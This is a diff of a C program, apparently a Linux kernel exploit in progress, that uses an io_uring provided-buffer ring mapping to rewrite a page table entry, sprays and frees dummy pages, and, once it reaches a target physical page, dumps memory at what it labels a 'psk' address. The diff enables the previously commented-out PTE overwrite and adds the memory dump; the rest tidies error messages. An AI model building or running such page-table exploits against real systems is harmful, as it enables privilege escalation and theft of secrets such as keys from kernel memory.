@@ -34,7 +34,7 @@ int main() {
         0
     );
     if (new_map_1 == MAP_FAILED) {
-        perror("mmap() failed");
+        perror("[-] mmap() failed");
         exit(1);
     }
 
@@ -47,7 +47,7 @@ int main() {
         0
     );
     if (new_map_2 == MAP_FAILED) {
-        perror("mmap() failed");
+        perror("[-] mmap() failed");
         exit(1);
     }
 
@@ -60,7 +60,7 @@ int main() {
         0
     );
     if (new_map_3 == MAP_FAILED) {
-        perror("mmap() failed");
+        perror("[-] mmap() failed");
         exit(1);
     }
 
@@ -87,7 +87,7 @@ int main() {
         IORING_OFF_PBUF_RING
     );
     if (pbuf_map == MAP_FAILED) {
-        perror("mmap() failed");
+        perror("[-] mmap() failed");
         exit(1);
     }
     printf("[+] pbuf mapped at %p\n", pbuf_map);
@@ -114,10 +114,10 @@ int main() {
     printf("[+] at %p: %lx\n", (uint64_t *)pbuf_map + 1, *((uint64_t *)pbuf_map + 1));
 
     // PTE 書き換え
-    // *(uint64_t *)pbuf_map = *((uint64_t *)pbuf_map + 1);
+    *(uint64_t *)pbuf_map = *((uint64_t *)pbuf_map + 1);
 
     // ページ解放
-    if (munmap(pbuf_map, 0x1000) == -1) perror("munmap() failed");
+    if (munmap(pbuf_map, 0x1000) == -1) perror("[-] munmap() failed");
 
     // ダミーページ確保
     dummy dummy_pages[DUMMY_PAGE];
@@ -143,7 +143,7 @@ int main() {
     }
 
     // new_map_3 解放
-    if (munmap(new_map_3, 0x1000) == -1) perror("munmap() failed");
+    if (munmap(new_map_3, 0x1000) == -1) perror("[-] munmap() failed");
 
     // ダミーページ解放
     for (int i = 0; i < DUMMY_PAGE; i++) {
@@ -180,9 +180,12 @@ int main() {
     if (target_page.phys_addr == phys_addr) {
         printf("[+] successfully lead to the target page\n");
         uint64_t psk_addr = (uint64_t)new_map_2 + PAGE_IN_OFFSET; 
-        printf("[+] psk address = 0x%lx\n", psk_addr);
+        for (int i = 0; i < 4; i++) {
+            printf("[+] %lx\n", *(uint64_t *)(psk_addr + i * 0x8));
+        }
     } else {
         printf("[-] failed lead to the target page\n");
+        if (munmap(new_map_2, 0x1000) == -1) perror("munmap() failed");
     }
 
     // printf("[+] should be 'a' but '%c'\n", *(char *)addr_2);
@@ -193,7 +196,6 @@ int main() {
 
     // メモリの解放関連
     if (munmap(new_map_1, 0x1000) == -1) perror("munmap() failed");
-    if (munmap(new_map_2, 0x1000) == -1) perror("munmap() failed");
     io_uring_queue_exit(&ring);
 
     return 0;
